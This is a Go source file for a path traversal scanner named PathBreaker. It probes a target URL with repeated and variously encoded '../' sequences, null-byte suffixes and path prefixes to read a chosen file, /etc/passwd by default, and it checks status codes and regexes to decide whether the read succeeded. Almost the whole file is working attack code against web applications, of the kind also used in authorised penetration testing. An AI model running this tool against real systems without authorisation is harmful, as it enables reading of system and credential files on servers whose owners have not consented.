package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
)

func checkResult(resp *http.Response) bool {
	// Step 1: Check status code
	statusCode := resp.StatusCode
	// Check if statusCode is in the whitelist
	for _, code := range whitelist {
		if statusCode == code {
			return true
		}
	}

	// Check if statusCode is in the blacklist
	for _, code := range blackList {
		if statusCode == code {
			return false
		}
	}

	// Step 2: Check response body using regex
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	bodyString := string(body)

	// Check if body matches blacklisted regex
	if blackregex != nil && blackregex.MatchString(bodyString) {
		return false
	}

	// Check if body matches whitelisted regex
	if whiteRegex != nil && whiteRegex.MatchString(bodyString) {
		return true
	}

	// If no whitelist regex and blacklist didn't match, allow it
	return false
}
func printBanner() {
	fmt.Println("  ____       _   _     ____                 _             \n |  _ \\ __ _| |_| |__ | __ ) _ __ ___  __ _| | _____ _ __ \n | |_) / _` | __| '_ \\|  _ \\| '__/ _ \\/ _` | |/ / _ \\ '__|\n |  __/ (_| | |_| | | | |_) | | |  __/ (_| |   <  __/ |   \n |_|   \\__,_|\\__|_| |_|____/|_|  \\___|\\__,_|_|\\_\\___|_|   \n                                                          ")
	fmt.Println("a parameter focused path traversal tool by Cerast Intelligence\n")
}

var (
	myClient   *http.Client
	whitelist  []int
	blackList  []int
	whiteRegex *regexp.Regexp
	blackregex *regexp.Regexp
	baseurl    string
	appendix   string
	targetfile string
)

var checkFunctions = [...]checkFunc{
	checkDirect,
	dotdotslashScan,
	dot4xlashScan,
	dotNestedlashScan,
	dotFlipFloplashScan,
	dotdotslashURLEncodedScan,
	dotdotslash16bitEncodedScan,
	dotdotslashDoubleURLEncodedScan,
}

func main() {
	printBanner()

	var urlFlag = flag.String("url", "", "URL to fetch")
	var proxyFlag = flag.String("proxy", "", "Proxy URL to fetch")
	var whiteListFlag = flag.String("whitelist", "200", "Whitelist to check")
	var blackListFlag = flag.String("blacklist", "404,500", "Blacklist to check")
	var whiteRegexFlag = flag.String("whiteregex", "", "Regex to check whitelist")
	var blackRegexFlag = flag.String("blackregex", "", "Regex to check blacklist")
	var targetFileFlag = flag.String("targetFile", "etc/passwd", "File tryin to extract")

	flag.Parse()

	// check if url is empty and abord
	if *urlFlag == "" {
		fmt.Println("Please provide a URL")
		os.Exit(1)
	}
	if *proxyFlag == "" {
		fmt.Println("[*] Using no proxy")
		myClient = &http.Client{}
	} else {
		fmt.Println("[+] Using Proxy: " + *proxyFlag)
		proxyUrl, err := url.Parse(*proxyFlag)
		if err != nil {
			panic(err)
		}
		myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
	}
	if *whiteListFlag != "" {
		temp := strings.Split(*whiteListFlag, ",")
		for _, entry := range temp {
			i, err := strconv.Atoi(entry)
			if err != nil {
				panic(entry + " is no valid number for the whitelist")
			}
			whitelist = append(whitelist, i)
		}
		fmt.Print("[+] Using whitelist: ")
		fmt.Println(whitelist)
	}
	if *blackListFlag != "" {
		temp := strings.Split(*blackListFlag, ",")
		for _, entry := range temp {
			i, err := strconv.Atoi(entry)
			if err != nil {
				panic(entry + " is no valid number for the blacklist")
			}
			blackList = append(blackList, i)
		}
		fmt.Print("[+] Using blacklist: ")
		fmt.Println(blackList)
	}
	if *whiteRegexFlag != "" {
		whiteRegex = regexp.MustCompile(*whiteRegexFlag)
		fmt.Println("[+] Using Whitelist-Regex: " + *whiteRegexFlag)
	}
	if *blackRegexFlag != "" {
		blackregex = regexp.MustCompile(*blackRegexFlag)
		fmt.Println("[+] Using Blacklist-Regex: " + *blackRegexFlag)
	}

	parts := strings.Split(*urlFlag, "PATHBREAKER")
	baseurl = parts[0]
	if len(parts) > 1 {
		appendix = parts[1]
	}
	targetfile = *targetFileFlag
	runAllChecks()
	runCheckWithNullencoding()
	preAppendChecks()

}
func checkDirect() (bool, string) {
	fmt.Println(baseurl + targetfile + appendix) // helping output
	resp, err := myClient.Get(baseurl + targetfile + appendix)
	if err != nil {
		panic(err)
	}
	return checkResult(resp), baseurl + targetfile + appendix
}
func checkDirecthelper(urlToRequest string) (bool, string) {
	fmt.Println(urlToRequest) // helping output
	resp, err := myClient.Get(urlToRequest)

	if err != nil {
		panic(err)
	}
	return checkResult(resp), urlToRequest
}
func recursiveScan(toRepeat string) (bool, string) {
	for i := 1; i <= 20; i++ { // change 5 to any number to adjust the number of ../
		success, path := checkDirecthelper(baseurl + strings.Repeat(toRepeat, i) + targetfile + appendix)
		if success {
			return success, path
		}
	}
	return false, ""
}

func runAllChecks() {
	for _, checkFunction := range checkFunctions {
		runCheck(checkFunction)
	}
}

type checkFunc func() (bool, string)

func runCheck(fn checkFunc) {
	success, result := fn()
	if success {
		fmt.Println(result)
	}
}
func dotdotslashScan() (bool, string) {
	return recursiveScan("../")
}
func dot4xlashScan() (bool, string) {
	return recursiveScan("..../")
}
func dotNestedlashScan() (bool, string) {
	return recursiveScan("....//")
}
func dotFlipFloplashScan() (bool, string) {
	return recursiveScan(`..\/`)
}
func dotdotslashURLEncodedScan() (bool, string) {
	return recursiveScan("%2e%2e%2f")
}
func dotdotslash16bitEncodedScan() (bool, string) {
	return recursiveScan("%u002e%u002e%u2215")
}
func dotdotslashDoubleURLEncodedScan() (bool, string) {
	return recursiveScan("%252e%252e%252f")
}
func runCheckWithNullencoding() {
	tempTarget := targetfile
	potentialEndings := [...]string{".png", ".pdf", ".exe", ".jpg", ".docx", ".jpeg", ".mp3", ".mp4", ".msi", ".txt", ""}
	for _, ending := range potentialEndings {
		targetfile = tempTarget + "%00" + ending
		runAllChecks()
	}
	targetfile = tempTarget
}
func preAppendChecks() {
	tempurl := baseurl
	potentialPreAppends := [...]string{"/", "/./", "~/", `\`, `..\`, "////"}
	for _, preAppend := range potentialPreAppends {
		baseurl = tempurl + preAppend
		runAllChecks()
		runCheckWithNullencoding()
	}
	baseurl = tempurl
}
